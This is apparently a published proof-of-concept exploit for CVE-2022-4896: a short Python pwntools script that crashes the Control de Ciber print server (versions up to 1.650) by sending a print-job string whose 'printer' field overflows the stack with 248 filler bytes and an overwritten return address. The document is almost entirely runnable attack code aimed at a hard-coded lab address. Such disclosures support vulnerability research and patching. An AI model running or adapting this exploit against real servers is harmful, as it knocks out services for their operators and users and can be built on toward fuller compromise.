# Exploit Title: Control de Ciber version - Denial of Service (DoS)
# Date: 19/04/2023
# Exploit Authors: Sergio Apellaniz
# Vendor Homepage: http://www.cbm.com.ar
# Software Link: http://www.cbm.com.ar/downloads.htm
# Version: <= 1.650
# Tested on: Linux
# CVE: CVE-2022-4896
# Github repo: https://github.com/sapellaniz/CVE-2022-4896

from pwn import *

SERVER_IP = "192.168.56.101"
SERVER_PORT = 10000

PAYLOAD = b"IMPRESORA"  # OFFSET
PAYLOAD += b"A"*(248-len("IMPRESORA"))  # OFFSET
PAYLOAD += b"B"*4       # RET ADDRESS

def bof(ip, port):
    """
    A client can create print jobs on the server by sending it the string
    "MI_ID: <id> <status> <printed_pages> <total_pages> <size> <document>
    <printer> <user> <pc>". In the "printer" field there is a stack
    overflow if a string longer than 248 bytes is sent. The overflow occurs
    when the server administrator tries to print or cancel the malicious print.
    """
    s = remote(ip, port)
    s.send(b"MI_ID: 1 pendiente 0 1 1 documento "+PAYLOAD+b" usuario-01 pc-01\r\n")


if __name__ == "__main__":
    bof(SERVER_IP, SERVER_PORT)
